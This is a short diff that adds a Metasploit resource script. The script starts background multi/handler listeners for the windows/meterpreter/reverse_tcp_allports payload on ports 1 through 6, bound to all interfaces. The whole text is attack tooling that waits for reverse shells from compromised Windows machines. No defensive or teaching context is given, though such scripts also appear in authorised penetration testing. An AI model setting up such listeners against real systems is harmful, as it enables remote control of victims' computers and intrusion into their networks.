@@ -1,0 +1,18 @@
+ 
+use multi/handler 
+set payload windows/meterpreter/reverse_tcp_allports
+set LPORT 1
+set LHOST 0.0.0.0
+exploit -j 
+set LPORT 2
+exploit -j 
+set LPORT 3
+exploit -j 
+set LPORT 4
+exploit -j 
+exploit -j 
+set LPORT 5
+exploit -j 
+set LPORT 6
+exploit -j 
+
